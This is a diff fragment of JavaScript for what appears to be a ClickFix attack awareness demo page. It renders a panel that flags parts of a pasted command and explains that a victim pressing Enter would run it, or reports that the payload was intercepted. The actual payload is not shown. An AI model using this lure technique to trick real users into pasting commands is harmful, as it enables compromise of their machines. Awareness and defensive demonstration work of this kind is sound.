+    var html = '<div class="breakdown">';
+    if (isPayload){
+      html += '<div class="headline danger"><span class="badge">✕</span> This is what actually would have run</div>';
+      html += '<div class="cmd-annotated">';
+      s.tokens.forEach(function(tok){
+        html += '<span class="tok'+(tok.flag?' flag':'')+'">'+escapeHtml(tok.t)+'</span>';
+      });
+      html += '</div>';
+      html += '<ul class="flag-list">';
+      s.tokens.filter(function(t){ return t.flag; }).forEach(function(t){
+        html += '<li><span class="chip">FLAG</span><span><b>'+escapeHtml(t.t.trim())+'</b> — '+t.note+'</span></li>';
+      });
+      html += '</ul>';
+      html += '<div class="note warn">⚠️ This payload made it all the way to the clipboard unmodified. In a real ClickFix attack, this is the exact moment the target presses Enter and the command runs — no further clicks, no confirmation dialog. This page still cannot execute it for you.</div>';
+    } else {
+      html += '<div class="headline safe"><span class="badge">✓</span> The malicious payload never reached this dialog</div>';
+      html += '<div class="cmd-annotated">'+escapeHtml(pasted || '(clipboard was empty)')+'</div>';
+      html += '<div class="note safe">🛡️ Whatever you pasted here does not match the intended payload — that means something between the copy step and this dialog already intercepted or quarantined it. That interception is the thing worth showing in a live demo.</div>';
+    }
+    html += '</div>';
+    breakdownPanel.innerHTML = html;
+    breakdownPanel.style.display = 'block';
+    breakdownPanel.scrollIntoView({behavior: window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'auto' : 'smooth', block:'nearest'});
+  }
+
+  tabs.forEach(function(t){
+    t.addEventListener('click', function(){ render(t.getAttribute('data-scenario')); });
+  });
+  runOk.addEventListener('click', runIt);
+  runCancel.addEventListener('click', function(){ render(current); });
+
+  render('verify');
+})();
+</script>
+</body>
+</html>
